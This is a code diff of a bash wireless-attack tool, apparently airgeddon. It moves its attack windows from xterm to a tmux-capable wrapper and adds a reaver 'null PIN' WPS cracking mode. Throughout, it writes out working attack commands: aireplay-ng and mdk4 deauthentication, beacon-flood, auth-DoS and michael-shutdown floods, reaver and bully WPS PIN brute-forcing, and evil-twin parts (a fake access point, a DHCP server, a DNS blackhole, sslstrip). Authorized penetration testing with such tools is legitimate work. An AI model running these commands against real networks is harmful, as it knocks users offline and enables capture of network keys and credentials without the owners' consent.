@@ -3315,7 +3567,8 @@ function exec_wps_pin_database_bully_attack() {
 	set_wps_attack_script "bully" "pindb"
 
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS bully known pins database based attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS bully known pins database based attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully known pins database based attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully known pins database based attack"
 }
 
 #Execute wps pin database reaver attack
@@ -3328,7 +3581,26 @@ function exec_wps_pin_database_reaver_attack() {
 	set_wps_attack_script "reaver" "pindb"
 
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver known pins database based attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS reaver known pins database based attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver known pins database based attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver known pins database based attack"
+}
+
+#Execute wps null pin reaver attack
+function exec_reaver_nullpin_attack() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 32 "green"
+
+	set_wps_attack_script "reaver" "nullpin"
+
+	echo
+	language_strings "${language}" 33 "yellow"
+	language_strings "${language}" 4 "read"
+	recalculate_windows_sizes
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS null pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS null pin reaver attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS null pin reaver attack"
 }
 
 #Execute DoS pursuit mode attack
@@ -3352,61 +3624,108 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "mdk4 ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"aireplay deauth attack")
 			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 			dos_delay=3
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface_pursuit_mode_deauth}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"wids / wips / wds confusion attack")
 			dos_delay=10
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "mdk4 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"beacon flood attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "mdk4 ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"auth dos attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} a -a ${bssid} -m -s 1024" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "mdk4 ${interface_pursuit_mode_deauth} a -a ${bssid} -m -s 1024"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"michael shutdown attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "mdk4 ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"Mdk4")
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk4 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" "Deauth (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "mdk4 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"Aireplay")
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
 			iwconfig "${interface_pursuit_mode_deauth}" channel "${channel}" > /dev/null 2>&1
 			dos_delay=3
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "Deauth (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"Wds Confusion")
 			dos_delay=10
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk4 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "Deauth (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "mdk4 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 	esac
 
-	dos_pursuit_mode_attack_pid=$!
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		dos_pursuit_mode_attack_pid=$!
+	fi
 	dos_pursuit_mode_pids+=("${dos_pursuit_mode_attack_pid}")
 
 	if [ "${channel}" -gt 14 ]; then
@@ -3520,7 +3839,8 @@ function exec_mdk4deauth() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "mdk4 amok attack" -e mdk4 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"mdk4 amok attack\"" "mdk4 ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "mdk4 amok attack" "active"
+		wait_for_process "mdk4 ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "mdk4 amok attack"
 	fi
 }
 
@@ -3549,7 +3869,8 @@ function exec_aireplaydeauth() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack" "active"
+		wait_for_process "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
 	fi
 }
 
@@ -3576,7 +3897,8 @@ function exec_wdsconfusion() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "wids / wips / wds confusion attack" -e mdk4 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"wids / wips / wds confusion attack\"" "mdk4 ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack" "active"
+		wait_for_process "mdk4 ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
 	fi
 }
 
@@ -3603,7 +3925,8 @@ function exec_beaconflood() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "beacon flood attack" -e mdk4 "${interface}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1
+		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"beacon flood attack\"" "mdk4 ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack" "active"
+		wait_for_process "mdk4 ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack"
 	fi
 }
 
@@ -3630,7 +3953,8 @@ function exec_authdos() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "auth dos attack" -e mdk4 "${interface}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1
+		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"auth dos attack\"" "mdk4 ${interface} a -a ${bssid} -m -s 1024" "auth dos attack" "active"
+		wait_for_process "mdk4 ${interface} a -a ${bssid} -m -s 1024" "auth dos attack"
 	fi
 }
 
@@ -3657,7 +3981,8 @@ function exec_michaelshutdown() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk4 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
+		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"michael shutdown attack\"" "mdk4 ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack" "active"
+		wait_for_process "mdk4 ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack"
 	fi
 }
 
@@ -3904,7 +4229,7 @@ function wep_option() {
 	exec_wep_allinone_attack
 }
 
-#Validate wps parameters for custom pin, pixie dust, bruteforce and pin database attacks
+#Validate wps parameters for custom pin, pixie dust, bruteforce, pin database and null pin attacks
 function wps_attacks_parameters() {
 
 	debug_print
@@ -3939,6 +4264,9 @@ function wps_attacks_parameters() {
 				ask_timeout "wps_pixiedust"
 			;;
 			"pindb_bully"|"pindb_reaver")
+				ask_timeout "wps_standard"
+			;;
+			"nullpin_reaver")
 				ask_timeout "wps_standard"
 			;;
 		esac
@@ -3998,6 +4326,12 @@ function print_options() {
 		language_strings "${language}" 594 "blue"
 	else
 		language_strings "${language}" 595 "blue"
+	fi
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		language_strings "${language}" 618 "blue"
+	else
+		language_strings "${language}" 619 "blue"
 	fi
 }
 
@@ -4422,7 +4756,7 @@ function clean_env_vars() {
 
 	debug_print
 
-	unset AIRGEDDON_AUTO_UPDATE AIRGEDDON_SKIP_INTRO AIRGEDDON_BASIC_COLORS AIRGEDDON_EXTENDED_COLORS AIRGEDDON_AUTO_CHANGE_LANGUAGE AIRGEDDON_SILENT_CHECKS AIRGEDDON_PRINT_HINTS AIRGEDDON_5GHZ_ENABLED AIRGEDDON_FORCE_IPTABLES AIRGEDDON_DEVELOPMENT_MODE AIRGEDDON_DEBUG_MODE
+	unset AIRGEDDON_AUTO_UPDATE AIRGEDDON_SKIP_INTRO AIRGEDDON_BASIC_COLORS AIRGEDDON_EXTENDED_COLORS AIRGEDDON_AUTO_CHANGE_LANGUAGE AIRGEDDON_SILENT_CHECKS AIRGEDDON_PRINT_HINTS AIRGEDDON_5GHZ_ENABLED AIRGEDDON_FORCE_IPTABLES AIRGEDDON_DEVELOPMENT_MODE AIRGEDDON_DEBUG_MODE AIRGEDDON_WINDOWS_HANDLING
 }
 
 #Clean temporary files
@@ -5088,6 +5422,7 @@ function wps_attacks_menu() {
 	language_strings "${language}" 359 reaver_attacks_dependencies[@]
 	language_strings "${language}" 348 bully_attacks_dependencies[@]
 	language_strings "${language}" 360 reaver_attacks_dependencies[@]
+	language_strings "${language}" 622 reaver_attacks_dependencies[@]
 	print_simple_separator
 	language_strings "${language}" 494
 	print_hint ${current_menu}
@@ -5269,6 +5604,27 @@ function wps_attacks_menu() {
 			fi
 		;;
 		13)
+			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				wps_attack="nullpin_reaver"
+				get_reaver_version
+				if validate_reaver_nullpin_version; then
+					echo
+					language_strings "${language}" 623 "yellow"
+					language_strings "${language}" 115 "read"
+					if wps_attacks_parameters; then
+						manage_wps_log
+						exec_reaver_nullpin_attack
+					fi
+				else
+					echo
+					language_strings "${language}" 624 "red"
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		14)
 			offline_pin_generation_menu
 		;;
 		*)
@@ -7280,6 +7636,7 @@ function exec_enterprise_attack() {
 	language_strings "${language}" 115 "read"
 
 	kill_et_windows
+
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		recover_current_channel
 	fi
@@ -7430,6 +7787,7 @@ function exec_et_onlyap_attack() {
 	language_strings "${language}" 115 "read"
 
 	kill_et_windows
+
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		recover_current_channel
 	fi
@@ -7457,6 +7815,7 @@ function exec_et_sniffing_attack() {
 	language_strings "${language}" 115 "read"
 
 	kill_et_windows
+
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		recover_current_channel
 	fi
@@ -7488,6 +7847,7 @@ function exec_et_sniffing_sslstrip_attack() {
 	language_strings "${language}" 115 "read"
 
 	kill_et_windows
+
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		recover_current_channel
 	fi
@@ -7529,6 +7889,7 @@ function exec_et_sniffing_sslstrip2_attack() {
 
 	kill_beef
 	kill_et_windows
+
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		recover_current_channel
 	fi
@@ -7565,6 +7926,7 @@ function exec_et_captive_portal_attack() {
 	language_strings "${language}" 115 "read"
 
 	kill_et_windows
+
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		recover_current_channel
 	fi
@@ -7695,8 +8057,15 @@ function launch_fake_ap() {
 			;;
 		esac
 	fi
-	xterm -hold -bg black -fg green -geometry "${hostapd_scr_window_position}" -T "AP" -e "${command}${log_command}" > /dev/null 2>&1 &
-	et_processes+=($!)
+	manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${hostapd_scr_window_position} -T \"AP\"" "${command}${log_command}" "AP"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "${command}"
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
+
 	sleep 3
 }
 
@@ -7926,8 +8295,15 @@ function launch_dhcp_server() {
 			dchcpd_scr_window_position=${g4_middleleft_window}
 		;;
 	esac
-	xterm -hold -bg black -fg pink -geometry "${dchcpd_scr_window_position}" -T "DHCP" -e "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}/clts.txt" > /dev/null 2>&1 &
-	et_processes+=($!)
+	manage_output "-hold -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${dchcpd_scr_window_position} -T \"DHCP\"" "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}clts.txt 2>&1" "DHCP"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "dhcpd -d -cf \"${dhcp_path}\" ${interface}"
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
+
 	sleep 2
 }
 
@@ -7977,8 +8353,15 @@ function exec_et_deauth() {
 		launch_dos_pursuit_mode_attack "${et_dos_attack}" "first_time"
 		pid_control_pursuit_mode "${et_dos_attack}" "evil_twin" &
 	else
-		xterm -hold -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth" -e "${deauth_et_cmd}" > /dev/null 2>&1 &
-		et_processes+=($!)
+		manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth\"" "${deauth_et_cmd}" "Deauth"
+		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+			et_processes+=($!)
+		else
+			get_tmux_process_id "${deauth_et_cmd}"
+			et_processes+=("${global_process_pid}")
+			global_process_pid=""
+		fi
+
 		sleep 1
 	fi
 }
@@ -8012,6 +8395,9 @@ function set_wps_attack_script() {
 			;;
 			"bruteforce")
 				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -f -N -d 2 -vvv"
+			;;
+			"nullpin")
+				attack_cmd1="reaver -i \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} \${script_bully_reaver_band_modifier} -L -f -N -g 1 -d 2 -vvv -p ''"
 			;;
 		esac
 	else
@@ -8066,6 +8452,10 @@ function set_wps_attack_script() {
 				script_attack_cmd1="${unbuffer} ${attack_cmd1}"
 				pin_header1="${white_color}Testing all possible PINs${normal_color}"
 			;;
+			"nullpin")
+				script_attack_cmd1="${unbuffer}timeout -s SIGTERM ${timeout_secs_per_pin} ${attack_cmd1}"
+				pin_header1="${white_color}Testing null PIN"
+			;;
 		esac
 
 		pin_header2=" (${yellow_color}"
@@ -8116,7 +8506,7 @@ function set_wps_attack_script() {
 	cat >&7 <<-'EOF'
 			if [ "${script_wps_attack_tool}" = "reaver" ]; then
 				case ${script_wps_attack_mode} in
-					"pindb"|"custompin"|"bruteforce")
+					"pindb"|"custompin"|"bruteforce"|"nullpin")
 						failed_attack_regexp="^\[!\][[:space:]]WPS[[:space:]]transaction[[:space:]]failed"
 						success_attack_badpin_regexp="^\[\-\][[:space:]]Failed[[:space:]]to[[:space:]]recover[[:space:]]WPA[[:space:]]key"
 						success_attack_goodpin_regexp="^\[\+\][[:space:]]Pin[[:space:]]cracked"
@@ -8145,7 +8535,7 @@ function set_wps_attack_script() {
 			fi
 
 			case ${script_wps_attack_mode} in
-				"pindb"|"custompin")
+				"pindb"|"custompin"|"nullpin")
 					for item in "${LINES_TO_PARSE[@]}"; do
 						if [ "${script_wps_attack_tool}" = "reaver" ]; then
 							if [[ ${item} =~ ${success_attack_goodpin_regexp} ]] || [[ ${pin_cracked} -eq 1 ]]; then
@@ -8234,6 +8624,14 @@ function set_wps_attack_script() {
 
 	cat >&7 <<-EOF
 				timeout_msg="${white_color}Timeout for Pixie Dust attack${normal_color}"
+	EOF
+
+	cat >&7 <<-'EOF'
+			elif [ "${script_wps_attack_mode}" = "nullpin" ]; then
+	EOF
+
+	cat >&7 <<-EOF
+				timeout_msg="${white_color}Timeout for null PIN${normal_color}"
 			else
 				timeout_msg="${white_color}Timeout for last PIN${normal_color}"
 			fi
@@ -8351,6 +8749,15 @@ function set_wps_attack_script() {
 				eval "${script_attack_cmd1}${script_attack_cmd2} ${colorize}"
 				parse_output
 			;;
+			"nullpin")
+				echo
+				echo -e "${pin_header1}"
+				(set -o pipefail && eval "${script_attack_cmd1}${script_attack_cmd2} ${colorize}")
+				if [ "$?" = "124" ]; then
+					this_pin_timeout=1
+				fi
+				parse_output
+			;;
 		esac
 
 		if [ ${pin_cracked} -eq 1 ]; then
@@ -8381,6 +8788,7 @@ function set_wps_attack_script() {
 
 		echo
 		echo -e "${white_color}Close this window"
+		read -r -d '' _ </dev/tty
 	EOF
 
 	exec 7>&-
@@ -8464,7 +8872,32 @@ function set_enterprise_control_script() {
 			echo -e "ifacemode=${ifacemode}"
 			} > "${enterprise_returning_vars_file}"
 		}
+	EOF
 
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&7 <<-EOF
+			function kill_tmux_windows() {
+
+				local TMUX_WINDOWS_LIST=()
+				local current_window_name
+				readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
+				for item in "\${TMUX_WINDOWS_LIST[@]}"; do
+					[[ "\${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="\${BASH_REMATCH[1]}"
+					if [ "\${current_window_name}" = "${tmux_main_window}" ]; then
+						continue
+					fi
+					if [ -n "\${1}" ]; then
+						if [ "\${current_window_name}" = "\${1}" ]; then
+							continue
+						fi
+					fi
+					tmux kill-window -t "${session_name}:\${current_window_name}"
+				done
+			}
+		EOF
+	fi
+
+	cat >&7 <<-'EOF'
 		#Kill Evil Twin Enterprise processes
 		function kill_enterprise_windows() {
 
@@ -8599,6 +9032,15 @@ function set_enterprise_control_script() {
 
 			if [ ${break_on_next_loop} -eq 1 ]; then
 				kill_enterprise_windows
+	EOF
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&7 <<-EOF
+				kill_tmux_windows "Control"
+		EOF
+	fi
+
+	cat >&7 <<-'EOF'
 				break
 			fi
 
@@ -8667,6 +9109,29 @@ function set_et_control_script() {
 				done
 			}
 	EOF
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&7 <<-EOF
+			function kill_tmux_windows() {
+
+				local TMUX_WINDOWS_LIST=()
+				local current_window_name
+				readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
+				for item in "\${TMUX_WINDOWS_LIST[@]}"; do
+					[[ "\${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="\${BASH_REMATCH[1]}"
+					if [ "\${current_window_name}" = "${tmux_main_window}" ]; then
+						continue
+					fi
+					if [ -n "\${1}" ]; then
+						if [ "\${current_window_name}" = "\${1}" ]; then
+							continue
+						fi
+					fi
+					tmux kill-window -t "${session_name}:\${current_window_name}"
+				done
+			}
+		EOF
+	fi
 
 	cat >&7 <<-EOF
 			function finish_evil_twin() {
@@ -8745,6 +9210,15 @@ function set_et_control_script() {
 				kill "$(ps -C aireplay-ng --no-headers -o pid | tr -d ' ')" &> /dev/null
 				kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
 				kill_et_windows
+	EOF
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&7 <<-EOF
+				kill_tmux_windows "Control"
+		EOF
+	fi
+
+	cat >&7 <<-EOF
 				exit 0
 			}
 		fi
@@ -8874,8 +9348,14 @@ function launch_dns_blackhole() {
 	debug_print
 
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg blue -geometry "${g4_middleright_window}" -T "DNS" -e "${optional_tools_names[12]} -i ${interface}" > /dev/null 2>&1 &
-	et_processes+=($!)
+	manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"DNS\"" "${optional_tools_names[12]} -i ${interface}" "DNS"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+	else
+		get_tmux_process_id "${optional_tools_names[12]} -i ${interface}"
+		et_processes+=("${global_process_pid}")
+		global_process_pid=""
+	fi
 }
 
 #Launch control window for Enterprise attacks
@@ -8884,8 +9364,14 @@ function launch_enterprise_control_window() {
 	debug_print
 
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg white -geometry "${g1_topright_window}" -T "Control" -e "bash \"${tmpdir}${control_enterprise_file}\"" > /dev/null 2>&1 &
-	enterprise_process_control_window=$!
+	manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Control\"" "bash \"${tmpdir}${control_enterprise_file}\"" "Control" "active"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		enterprise_process_control_window=$!
+	else
+		get_tmux_process_id "bash \"${tmpdir}${control_enterprise_file}\""
+		enterprise_process_control_window="${global_process_pid}"
+		global_process_pid=""
+	fi
 }
 
 #Launch control window for Evil Twin attacks
@@ -8915,8 +9401,14 @@ function launch_et_control_window() {
 			control_scr_window_position=${g4_topright_window}
 		;;
 	esac
-	xterm -hold -bg black -fg white -geometry "${control_scr_window_position}" -T "Control" -e "bash \"${tmpdir}${control_et_file}\"" > /dev/null 2>&1 &
-	et_process_control_window=$!
+	manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${control_scr_window_position} -T \"Control\"" "bash \"${tmpdir}${control_et_file}\"" "Control" "active"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_process_control_window=$!
+	else
